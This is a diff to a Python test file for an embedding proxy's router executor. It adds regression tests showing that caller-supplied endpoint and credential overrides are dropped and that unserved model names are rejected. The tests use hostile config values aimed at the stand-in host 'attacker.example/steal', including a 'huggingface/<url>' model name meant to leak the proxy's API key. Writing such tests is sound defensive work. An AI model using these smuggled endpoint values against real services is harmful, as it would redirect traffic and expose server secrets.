@@ -130,6 +130,7 @@ class TestRouterEmbeddingIntegration:
 
         explicit_config = {
             "api_base": "https://embedding.example/v1",
+            "base_url": "https://embedding.example/v1",
             "api_key": "store-key",
             "metadata": {
                 "configured": True,
@@ -147,8 +148,6 @@ class TestRouterEmbeddingIntegration:
         mock_router.embedding.assert_called_once_with(
             model="team-alias",
             input=["query"],
-            api_base="https://embedding.example/v1",
-            api_key="store-key",
             metadata={"configured": True, "user_api_key_team_id": "team-a"},
         )
 
@@ -161,50 +160,56 @@ class TestRouterEmbeddingIntegration:
 
         assert sync_alias.data[0]["embedding"] == QUERY_VECTOR
         assert async_alias.data[0]["embedding"] == QUERY_VECTOR
-        assert openai_route.call_count == 2
-        assert _sent(store_route, 0) == ("Bearer store-key", "text-embedding-3-small", ["sync query"])
-        assert _sent(store_route, 1) == ("Bearer store-key", "text-embedding-3-small", ["async query"])
+        assert store_route.call_count == 0
+        assert _sent(openai_route, 2) == ("Bearer deployment-key", "text-embedding-3-small", ["sync query"])
+        assert _sent(openai_route, 3) == ("Bearer deployment-key", "text-embedding-3-small", ["async query"])
 
     @pytest.mark.asyncio
-    async def test_router_executor_falls_back_to_sdk_for_models_the_router_does_not_serve(
+    async def test_router_executor_drops_caller_endpoint_and_credential_overrides(
         self, respx_mock: respx.MockRouter, monkeypatch: pytest.MonkeyPatch
     ):
+        """Regression: a store's litellm_embedding_config could carry an api_base that redirected a
+        legitimate, router-served deployment's traffic (and its real key) to an attacker host."""
         monkeypatch.setattr(litellm, "disable_aiohttp_transport", True)
         monkeypatch.delenv("OPENAI_API_KEY", raising=False)
-        store_route = _mock_embedding_route(respx_mock, STORE_EMBEDDINGS_URL)
-        executor = RouterVectorStoreEmbeddingExecutor(
-            router=_alias_router(),
-            metadata={"user_api_key_team_id": "team-a"},
-        )
-        inline_config = {"api_base": "https://embedding.example/v1", "api_key": "store-key"}
+        openai_route = _mock_embedding_route(respx_mock, OPENAI_EMBEDDINGS_URL)
+        attacker_route = _mock_embedding_route(respx_mock, "https://attacker.example/steal")
+        executor = RouterVectorStoreEmbeddingExecutor(router=_alias_router(), metadata={})
+        malicious_config = {"api_base": "https://attacker.example/steal", "api_key": "attacker-supplied"}
 
-        sync_response = executor.embed("openai/text-embedding-3-large", "sync query", inline_config)
-        async_response = await executor.aembed("openai/text-embedding-3-large", "async query", inline_config)
+        sync_response = executor.embed("team-alias", "sync query", malicious_config)
+        async_response = await executor.aembed("team-alias", "async query", malicious_config)
 
         assert sync_response.data[0]["embedding"] == QUERY_VECTOR
         assert async_response.data[0]["embedding"] == QUERY_VECTOR
-        assert _sent(store_route, 0) == ("Bearer store-key", "text-embedding-3-large", ["sync query"])
-        assert _sent(store_route, 1) == ("Bearer store-key", "text-embedding-3-large", ["async query"])
+        assert attacker_route.call_count == 0
+        assert _sent(openai_route, 0) == ("Bearer deployment-key", "text-embedding-3-small", ["sync query"])
+        assert _sent(openai_route, 1) == ("Bearer deployment-key", "text-embedding-3-small", ["async query"])
 
     @pytest.mark.asyncio
-    async def test_router_executor_embeds_unserved_models_through_the_sdk(
-        self, respx_mock: respx.MockRouter, monkeypatch: pytest.MonkeyPatch
+    @pytest.mark.parametrize(
+        "model",
+        ["huggingface/https://attacker.example/steal", "openai/text-embedding-3-large", "text-embedding-3-large"],
+    )
+    async def test_router_executor_rejects_models_the_router_does_not_serve(
+        self, respx_mock: respx.MockRouter, monkeypatch: pytest.MonkeyPatch, model: str
     ):
+        """Regression: a non-admin saved huggingface/<their url> as a store's embedding model and the executor
+        fell back to litellm directly, posting the proxy's HUGGINGFACE_API_KEY to that url on every search."""
         monkeypatch.setattr(litellm, "disable_aiohttp_transport", True)
+        monkeypatch.setenv("HUGGINGFACE_API_KEY", "hf-proxy-secret")
         monkeypatch.setenv("OPENAI_API_KEY", "env-key")
+        attacker_route = _mock_embedding_route(respx_mock, "https://attacker.example/steal")
         openai_route = _mock_embedding_route(respx_mock, OPENAI_EMBEDDINGS_URL)
-        executor = RouterVectorStoreEmbeddingExecutor(
-            router=_alias_router(),
-            metadata={"user_api_key_team_id": "team-a"},
-        )
+        executor = RouterVectorStoreEmbeddingExecutor(router=_alias_router(), metadata={})
 
-        sync_response = executor.embed("text-embedding-3-large", "sync query", {})
-        async_response = await executor.aembed("text-embedding-3-large", "async query", {})
+        with pytest.raises(litellm.BadRequestError, match=f"embedding model {model} is not configured on this proxy"):
+            executor.embed(model, "sync query", {})
+        with pytest.raises(litellm.BadRequestError, match=f"embedding model {model} is not configured on this proxy"):
+            await executor.aembed(model, "async query", {})
 
-        assert sync_response.data[0]["embedding"] == QUERY_VECTOR
-        assert async_response.data[0]["embedding"] == QUERY_VECTOR
-        assert _sent(openai_route, 0) == ("Bearer env-key", "text-embedding-3-large", ["sync query"])
-        assert _sent(openai_route, 1) == ("Bearer env-key", "text-embedding-3-large", ["async query"])
+        assert attacker_route.call_count == 0
+        assert openai_route.call_count == 0
 
     def test_router_executor_routes_deployment_model_names_through_the_router(
         self, respx_mock: respx.MockRouter, monkeypatch: pytest.MonkeyPatch
